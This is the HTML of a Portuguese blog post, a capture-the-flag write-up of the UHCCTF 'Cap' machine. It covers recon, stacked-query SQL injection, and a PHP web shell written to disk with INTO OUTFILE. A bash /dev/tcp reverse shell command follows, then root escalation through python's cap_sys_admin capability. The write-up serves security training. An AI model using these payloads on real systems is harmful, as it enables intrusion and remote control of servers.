@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>UHCCTF (Classificatória) - Cap | big0us</title>
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="UHCCTF (Classificatória) - Cap" />
+<meta name="author" content="Vinicius Pereira" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
+<meta property="og:site_name" content="big0us" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-04T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="UHCCTF (Classificatória) - Cap" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificatória) - Cap","dateModified":"2021-06-04T00:00:00+00:00","url":"/2021/06/04/uhc-cap.html","datePublished":"2021-06-04T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/06/04/uhc-cap.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/avatar.gif
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">UHCCTF (Classificatória) - Cap</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/pt-br/">pt-br</a>
+      
+      <a class="tag" href="/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/tag/write-up/">write-up</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 04 Jun 2021</div>
+  
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-72MZ89K41P');
+</script>
+
+<p>Essa máquina foi feita pelo Kadu para a classificatória do UHCv35.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Iniciando o desafio e pegando a url podemos observar que ele tem uma página um tanto quanto estranha, parece ser uma API, já que retorna um objeto JSON:</p>
+
+<p><img src="/assets/cap/Untitled.png" alt="/assets/cap/Untitled.png" /></p>
+
+<p>Vamos então partir direto para o fuzzing, vou rodar a wordlist common.txt e a quiclhits.txt:</p>
+
+<p>common.txt:</p>
+
+<p><img src="/assets/cap/Untitled%201.png" alt="/assets/cap/Untitled%201.png" /></p>
+
+<p>quickhits.txt:</p>
+
+<p><img src="/assets/cap/Untitled%202.png" alt="/assets/cap/Untitled%202.png" /></p>
+
+<p>Achamos um arquivo de backup! Vou baixar e abrir no visual studio code.</p>
+
+<p><img src="/assets/cap/Untitled%203.png" alt="/assets/cap/Untitled%203.png" /></p>
+
+<p>Hora de debugar!</p>
+
+<p>Esse código basicamente é uma tentativa de um tipo de API para interagir com algum tipo de banco de dados, ele pega informações de databases e é capaz de inserir informações também, podemos perceber que ele usa um micro framework chamado Slim. (<a href="https://www.slimframework.com/docs/v2/">https://www.slimframework.com/docs/v2/</a>)</p>
+
+<p>Essa parte envolve muito code review, que é inclusive o nome do challenge da primeira flag. Fui testando tudo e lendo os erros (debug mode estava ativo).</p>
+
+<p>Dando uma lida e debugando um pouco podemos perceber que existe uma rota dessa api que faz uma consulta no banco de dados na tabela usuarios.</p>
+
+<p>Rota:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://cap.uhclabs.com/_ul/uploads/0
+</code></pre></div></div>
+
+<p>Código:</p>
+
+<p><img src="/assets/cap/Untitled%204.png" alt="/assets/cap/Untitled%204.png" /></p>
+
+<p>Basicamente aonde está escrito :controller é aonde vamos inserir o nome do arquivo que contém a classe que vamos usar, no caso vamos ussar o usuarios.class.php, e :parametrer sera o $data que será passado na query da consulta como podemos ver aqui:</p>
+
+<p><img src="/assets/cap/Untitled%205.png" alt="/assets/cap/Untitled%205.png" /></p>
+
+<p>Agora vamos rodar:</p>
+
+<p>Testei alguns ids e no 2 temos a primeira flag hehe:</p>
+
+<p><img src="/assets/cap/Untitled%206.png" alt="/assets/cap/Untitled%206.png" /></p>
+
+<p>Certo, como podemos perceber no código, nossos parâmetros não passam por nenhum tipo de tratamento, obviamente o site está vulnerável a Sql injection.</p>
+
+<p><img src="/assets/cap/Untitled%207.png" alt="/assets/cap/Untitled%207.png" /></p>
+
+<p>Então vamos ver o que podemos fazer aqui.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="sql-injection">Sql Injection</h2>
+
+<p>Podemos observar que o banco de dados usado é o MariaDB.</p>
+
+<p>Vamos começar tentando mandar querys para a aplicação.</p>
+
+<p>Para demonstrar o que está acontecendo irei mostrar as payloads e como a query está sendo executada no site.</p>
+
+<ul>
+  <li>A primeira coisa que irei fazer vai ser tentar adicionar um usuário, ja que temos o código sabemos o nome da tabela…</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cap.uhclabs.com/_ul/usuarios/1<span class="p">;</span>insert%20into%20usuarios%20<span class="o">(</span>nome<span class="o">)</span>%20values%20<span class="o">(</span><span class="s1">'big0us'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Com um Url encode na nossa payload se enviarmos, a query ficará assim:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">usuarios</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">usuarios</span> <span class="p">(</span><span class="n">nome</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'big0us'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Enviando mais algumas vezes podemos ver que nosso usuário já está no banco de dados com a seguinte rota:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cap.uhclabs.com/_ul/usuarios/0
+</code></pre></div></div>
+
+<ul>
+  <li>No MariaDB existe um comando que possibilita salvar o resultado da query em um arquivo…</li>
+  <li>Lendo o código fonte, podemos abrir arquivos que estiverem no /classes/ apenas enviando um request POST, com o nome do arquivo sem o .classes e sem o .php…</li>
+</ul>
+
+<p><img src="/assets/cap/Untitled%208.png" alt="/assets/cap/Untitled%208.png" /></p>
+
+<ul>
+  <li>Se pudermos salvar arquivos de consultas de querys em qualquer diretório e podemos escrever e rodar arquivos no servidor, temos tudo para conseguir um RCE. Mas como?</li>
+  <li>(Existem várias formas de fazer isso vou descrever como eu fiz)</li>
+  <li>Já que posso criar um usuário, vou criar um usuário contendo um código php no nome, assim quando eu jogar isso para dentro de um arquivo, será executado… Então vamos as payloads:</li>
+</ul>
+
+<p>URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cap.uhclabs.com/_ul/usuarios/1;1%3Bselect%20into%20usuarios%20%28nome%29%20values%20%28%27%3C%3Fphp%20system%28%24%5FGET%5B0%5D%3F%3E%27%29%29
+</code></pre></div></div>
+
+<p>Query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">into</span> <span class="n">usuarios</span> <span class="p">(</span><span class="n">nome</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'&lt;?php system($_GET[0]?&gt;'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>E agora com o usuário criado, vamos fazer uma consulta que retorne o nome do usuário, e salvar isso em um arquivo… (dei o nome de “u”)</p>
+
+<p>URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cap.uhclabs.com/_ul/usuarios/1%3Bselect%20%2A%20from%20usuarios%20into%20outfile%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fu%2Eclass%2Ephp%27
+</code></pre></div></div>
+
+<p>Query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">usuarios</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'/var/www/html/classes/u.class.php'</span>
+</code></pre></div></div>
+
+<p>Agora que já montamos nosso arquivo malicioso vamos ao request:</p>
+
+<p><img src="/assets/cap/Untitled%209.png" alt="/assets/cap/Untitled%209.png" /></p>
+
+<p>Agora que temos RCE vamos pegar uma shell.</p>
+
+<h1 id="pós-exploitation">Pós exploitation</h1>
+<h2 id="root-capability">Root Capability</h2>
+
+<p>Utilizei uma payload simples encodada em url encode:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/ip/porta 0&gt;&amp;1"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/cap/Untitled%2010.png" alt="/assets/cap/Untitled%2010.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Full tty shell
+in your shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+in your terminal~ stty raw -echo; fg
+ENTER
+in your shell~ export TERM=xterm
+</code></pre></div></div>
+
+<p>Indo até o / podemos encontrar nossa flag!</p>
+
+<p><img src="/assets/cap/Untitled%2011.png" alt="/assets/cap/Untitled%2011.png" /></p>
+
+<p>Rodando alguns comandos de enumeração logo pude encontrar qual é a vulnerabilidade do priv esc (o linpeas teria achado), o comando que eu rodei para encontra-la é o getcap, que mostra para nós os capabilities que os binários do linux possuem.</p>
+
+<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">Linux Capabilities</a></p>
+
+<p><img src="/assets/cap/Untitled%2012.png" alt="/assets/cap/Untitled%2012.png" /></p>
+
+<p>Podemos ver que o python está com um capability chamado sys_admin, dando uma olhada no hacktricks sobre como explorar isso, podemos ver que existe uma forma de sobrescrevermos o arquivo /etc/passwd adicionando uma senha que nós sabemos para o usuário root.</p>
+
+<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin</a></p>
+
+<p><img src="/assets/cap/Untitled%2013.png" alt="/assets/cap/Untitled%2013.png" /></p>
+
+<p>Exploitation:</p>
+
+<p><img src="/assets/cap/Untitled%2014.png" alt="/assets/cap/Untitled%2014.png" /></p>
+
+<p><img src="/assets/cap/Untitled%2015.png" alt="/assets/cap/Untitled%2015.png" /></p>
+
+<p><img src="/assets/cap/Untitled%2016.png" alt="/assets/cap/Untitled%2016.png" /></p>
+
+<p><img src="/assets/cap/Untitled%2017.png" alt="/assets/cap/Untitled%2017.png" /></p>
+
+<p>Depois de rodar o exploit damos um:</p>
+
+<p><img src="/assets/cap/Untitled%2018.png" alt="/assets/cap/Untitled%2018.png" /></p>
+
+<p>E ai está nossa flag, parabéns kadu pela máquina e obrigado a você que leu até aqui!</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
+            CTF LatinoWare 2021 - Planilhas Baby
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/03/uhc-storm.html">
+            UHCCTF (Classificatória) - Storm
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/06/02/uhc-hacked.html">
+            UHCCTF (Classificatória) - Hacked (Official Write-Up)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
